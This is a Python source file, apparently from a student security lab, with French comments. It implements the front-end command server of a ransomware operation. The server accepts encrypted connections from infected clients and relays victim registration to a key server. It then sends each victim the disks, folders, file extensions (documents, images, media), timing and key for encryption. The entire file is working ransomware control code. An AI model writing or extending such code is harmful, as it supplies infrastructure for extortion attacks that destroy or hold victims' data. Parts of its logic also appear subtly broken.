import threading
import queue
import utile.network as net
import utile.message as message
import utile.security as secu
import utile.config as config

# CONSTANTES
ransomware_threads = []
THREADS_QUEUE = []


def Serveur_cles(FIFO, FIFO_RESP, CFG):
    # Ouverture d'un serveur avec comme adresse, port et timeout des valeurs du fichier CFG
    conn, gp = net.connect_to_serv(adresse=CFG['IP'], port=int(CFG['PORT_CLES']))
    # get et task done pour débloquer le join se trouvant au début du code (qui permet de ne pas créer le
    # le thread ransomware sans avoir de connexion sur le serveur de clés avant
    FIFO.get()
    FIFO.task_done()
    # Création d'une clé Diffie Hellman pour le chiffrement AES-GCM
    key = secu.Diffie_Hellman_exchange_key(conn, gp)

    while True:
        # Essaie de recevoir un paquet à l'infinie
        packet = FIFO_RESP.get()
        # Chiffrement du paquet reçu
        packet = secu.AES_GCM_encrypt(packet, key)
        # Envoi du paquet vers le serveur de clés
        net.send_message(conn, packet)
        # Ensuite le serveur frontal écoute pour recevoir un message
        packet_retour = net.receive_message(conn)
        # le déchiffre
        packet_retour = secu.AES_GCM_decrypt(packet_retour, key)
        # et l'envoie dans le ThreadMaster
        FIFO.put(packet_retour)
        # Le serveur clés était créé de cette manière pour simplifier la vie sur l'instant T
        # car rien de plus n'était demandé. Donc ici pas besoin de faire plus


def ransomware(FIFO, PORT, CFG):
    # Initialisation de constante servant principalement d'indicateur
    indicateur = False
    dead = False
    # Ouverture d'un serveur avec comme adresse, port et timeout des valeurs du fichier CFG
    socket_serv = net.start_net_serv_client(adresse=CFG['IP'], port=PORT)
    # Création d'une queue FIFO
    FIFO_resp = queue.Queue()
    # Ajout de cette Queue FIFO dans une liste en constante (premier thread lancé = première queue fifo de la liste)
    THREADS_QUEUE.append(FIFO_resp)
    # Récupère l'id du ransomware (temporaire : avant d'avoir l'id venant de la BD)
    # Si 13 threads dans la liste, l'id est 12
    # Comme ça on sait que l'id de ransomware 12 est la queue de THREADS_QUEUE[12]
    id_thread_list = len(THREADS_QUEUE) - 1
    # Création d'un doublon qui sera utile plus tard pour renommer le thread
    id_thread = id_thread_list
    # Affichage de l'écoute
    print('Ouverture d\'une écoute sur le port', PORT)

    while True:
        # Ecoute à l'infinie pour pouvoir recevoir des connexions à l'infinie
        # Le socket.accept() a été enlevé de la fonction de network pour pouvoir relancer à l'infinie
        # Un serveur sans recréer un socket ou autre -> meilleur performances
        conn, addr = socket_serv.accept()
        # Création d'une clé Diffie Hellman servant au chiffrement AES-GCM 256
        key = secu.Diffie_Hellman_exchange_key(conn)
        if dead:
            # Resté dans l'état car non intéressant pour le labo4. Mais ce point aurait été éprouvé techniquement
            # Avec les labos suivants
            # supprimer la boucle infinie à la place?
            # écrire dans le fichier CFG le nouveau port, comme ça un nouveau serveur peut s'ouvrir sur le premier port?
            # (8443) en soit ça sert à rien, c'est juste pour proposer quelque chose de pratique et intéressant...
            break
        if not indicateur:
            # Au début du thread, Indicateur sera tounjours false. Donc on rentrera toujours dans cette condition
            # en premier. Un message {RANSOMWARE_REQ: None} va être envoyé vers le threadmaster
            # ce message permet de donner l'indication pour créer un nouveau thread (expliqué plus bas)
            FIFO.put("{RANSOMWARE_REQ: None}")
            # Passage de l'indicateur a True pour ne plus jamais rentrer dans cette condition (pour ne pas créer des
            # Ransomware à l'infinie)
            indicateur = True
            dead = True
            # Si on ne rentre dans ce except, cela veut dire que le destinataire s'est déconnecté ou crash, ...
            # Donc déconnexion "officielle" avec une annonce dans la console
        print(
            f'[+] Connexion établie sur le Thread Ransomware-{id_thread} sur l\'adresse {conn.getsockname()[0]}:'
            f'{conn.getsockname()[1]}\n')
        while True:
            try:
                # Récupère le message
                recv_data = net.receive_message(conn)
                # Déchiffre le message
                recv_data = secu.AES_GCM_decrypt(recv_data, key)
                # Envoi dans la Queue FIFO avec un ID (permet de correspondre les Queues dans le ThreadMaster)
                FIFO.put([recv_data, FIFO_resp])

            except:
                # Si on ne rentre dans ce except, cela veut dire que le destinataire s'est déconnecté ou crash, ...
                # Donc déconnexion "officielle" avec une annonce dans la console
                conn.close()
                print(f'[+] Déconnexion du Ransomware-{id_thread} sur le port : {PORT}')
                break

            while True:
                #  Récupère des paquets dans la Queue FIFO (à l'infinie vu que l'on se trouve dans une boucle)
                data = FIFO_resp.get()
                # Chiffrement du paquet
                data_encrypted = secu.AES_GCM_encrypt(data, key)
                # Envoi du paquet vers le destinataire (console de contrôle)
                net.send_message(conn, data_encrypted)

                if message.get_message_type(data) == 'INITIALIZE_RESP':
                    # si le type de paquet est history end ou list victim end on sort de la boucle
                    # pour retourner au try except grâce au while true
                    # Changement du nom du Ransomware (le thread) en donnant son vrai ID (venant de la BD)
                    ransomware_threads[id_thread_list].setName('Ransomware-' + str(data['CONFIGURE']))
                    # Donne la valeur de cet ID au doublon. Permet d'afficher le vrai ID en console sans perturber
                    # La l'indexation de la liste THREADS_QUEUE (Changement de l'id vers 57, s'il y a deux queue
                    # dans la liste, THREADS_QUEUE[57] n'existe pas -> THREADS_QUEUE[1] existe
                    id_thread = data['CONFIGURE']
                    break


def ThreadMaster(FIFO_RESP_CLES, data, FIFO_CACHE):
    # Essaie de recevoir le recv_data et le FIFO_resp_thread
    try:
        recv_data, FIFO_resp_thread = data
    except:
        # S'il n'y a qu'une seule donnée dans le recv_data, cela veut dire qu'une Queue attend dans le "FIFO_CACHE"
        recv_data = data
        # Récupération de la queue en cache
        FIFO_resp_thread = FIFO_CACHE.get()
    # Récupération du type de message pour trouver la bonne condition
    message_type = message.get_message_type(recv_data)
    if message_type == 'INITIALIZE_REQ':
        # met la Queue en cache pour être récupérée plus tard
        FIFO_CACHE.put(FIFO_resp_thread)
        # met l'OS en cache pour être récupérée plus tard
        FIFO_CACHE.put(recv_data['OS'])
        # Envoi de la donnée vers le serveur de clés (rebond)
        FIFO_RESP_CLES.put(recv_data)

    if message_type == 'INITIALIZE_KEY':
        # Divise la data en une id, key, state
        id_victim, key, state = recv_data
        # Récupère l'os qui est en cache
        OS = FIFO_CACHE.get()
        # Si l'os est workstation -> récupère les données de la template workstation
        if OS == 'WORKSTATION':
            cfg_file = config.load_config('workstation')

            # if not cfg_file:
            #     config.create_config('workstation')
            #     workstation = config.load_config('workstation')
            #     config.set_config(workstation, 1, 'DISKS', "['z:', 'y:']")
            #     config.set_config(workstation, 1, 'PATHS', "['tests_1', 'tests_2']")
            #     config.set_config(workstation, 1, 'FILE_EXT',
            #                       "['.jpg', '.png', '.txt', '.avi', '.mp4', '.mp3', '.pdf' ]")
            #     config.set_config(workstation, 1, 'FREQ', 120)
            #     config.set_config(workstation, 1, 'KEY', None)
            #     config.set_config(workstation, 1, 'STATE', "INITIALIZE")
            #     config.save_config(workstation, 'workstation')
            # cfg_file = config.load_config('workstation')
        else:
            # Si l'os est serveur -> récupère les données de la template workstation
            cfg_file = config.load_config('serveur')

            # if not cfg_file:
            #     config.create_config('serveur')
            #     serveur = config.load_config('serveur')
            #     config.set_config(serveur, 1, 'DISKS', "['z:', 'y:']")
            #     config.set_config(serveur, 1, 'PATHS', "['tests_1', 'tests_2']")
            #     config.set_config(serveur, 1, 'FILE_EXT', "['.docx', '.doc', '.txt', '.xlsx', '.xls', '.pdf']")
            #     config.set_config(serveur, 1, 'FREQ', 60)
            #     config.set_config(serveur, 1, 'KEY', None)
            #     config.set_config(serveur, 1, 'STATE', "INITIALIZE")
            #     config.save_config(serveur, 'serveur')
            # cfg_file = config.load_config('serveur')

        # Création du paquet initialize resp avec les éléments reçu + les éléments du fichier CFG template
        packet = message.set_message('INITIALIZE_RESP',
                                     [recv_data[id_victim], cfg_file['DISKS'], cfg_file['PATHS'], cfg_file['FILE_EXT'],
                                      cfg_file['FREQ'], recv_data[key],
                                      recv_data[state]])

        # envoi de ce paquet vers le thread correspondant
        FIFO_resp_thread.put(packet)


def main():
    # Initialisation du fichier config
    cfg_file_frontal = config.load_config('serveur_frontal')
    # if not cfg_file_frontal:
    #     config.create_config('serveur_frontal')
    #     serveur_frontal = config.load_config('serveur_frontal')
    #     config.set_config(serveur_frontal, 1, 'IP', "localhost")
    #     config.set_config(serveur_frontal, 1, 'PORT_CLES', "8381")
    #     config.set_config(serveur_frontal, 1, 'PORT_RW', "8443")
    #     config.save_config(serveur_frontal, 'serveur_frontal')
    #
    # # Reload car posait problème au démarrage sans CFG (crash)
    # cfg_file_frontal = config.load_config('serveur_frontal')

    # Récupération du port venant du fichier CFG
    PORT_INCREMENT = int(cfg_file_frontal['PORT_RW'])
    # Création d'une queue FIFO générale (pour les messages)
    FIFO = queue.Queue()
    # Création d'une queue FIFO spécifque au serveur clés
    FIFO_RESP_CLES = queue.Queue()
    # Création d'une queue FIFO spécifique au cache
    FIFO_CACHE = queue.Queue()
    # création des threads
    Serveur_cles_thread = threading.Thread(target=Serveur_cles, daemon=True,
                                           args=(FIFO, FIFO_RESP_CLES, cfg_file_frontal))
    ransomware1 = threading.Thread(target=ransomware, daemon=True, args=(FIFO, PORT_INCREMENT, cfg_file_frontal))

    # Récupération de l'id du thread ransomware
    name, id_thread = (ransomware1.getName()).split('-')
    # Pour ensuite lui attribuer un vrai nom (pour créer une logique avec la liste THREADS_QUEUE en constante
    ransomware1.setName('Ransomware-' + str((int(id_thread) - 2)))

    # Ajout du thread dans la liste ransomware_thread en constante
    ransomware_threads.append(ransomware1)

    # Lancement du thread
    Serveur_cles_thread.start()
    # Blocage du code avec un message factice tant que l'on est pas connecté au serveur de clés
    FIFO.put('WAITING FOR "Serveur clés"')
    FIFO.join()
    # Lancement du thread ransomware dès que l'on est connecté au serveur de clés
    ransomware1.start()

    while True:
        # Récupération des messages à l'infinie
        data = FIFO.get()
        # si le message est "{RANSOMWARE_REQ: None}" cela veut dire que l'on veut créer un nouveau ransomware
        if data == "{RANSOMWARE_REQ: None}":
            # Ajout de 1 au port
            PORT_INCREMENT += 1
            # Création d'un nouveau ransomware
            new_ransomware = threading.Thread(target=ransomware, daemon=True,
                                              args=(FIFO, PORT_INCREMENT, cfg_file_frontal))
            # Récupère l'id
            name, id_thread = (new_ransomware.getName()).split('-')
            # Attribution d'un vrai nom pour le thread
            new_ransomware.setName('Ransomware-' + str((int(id_thread) - 2)))
            # Ajout dans une liste au cas où pour plus tard
            ransomware_threads.append(new_ransomware)
            # lancement du nouveau thread
            new_ransomware.start()
        else:
            # Sinon, le message sera traité dans le threadmaster
            ThreadMaster(FIFO_RESP_CLES, data, FIFO_CACHE)


if __name__ == '__main__':
    main()
